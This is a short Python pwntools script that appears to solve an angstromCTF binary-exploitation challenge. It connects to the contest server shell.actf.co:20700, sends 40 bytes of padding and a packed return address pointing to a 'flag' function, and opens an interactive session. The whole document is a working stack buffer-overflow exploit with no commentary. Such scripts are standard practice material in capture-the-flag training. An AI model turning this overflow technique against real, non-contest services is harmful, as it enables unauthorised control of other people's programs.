from pwn import *

flag = 0x401186
p = remote('shell.actf.co',20700)
pad = "A" * 40
ret = 0x000000000040101a 
payload = ""
payload += pad
payload += p64(flag)

p.recvuntil("name? ")
raw_input("continue? ")
p.sendline(payload)
p.interactive()
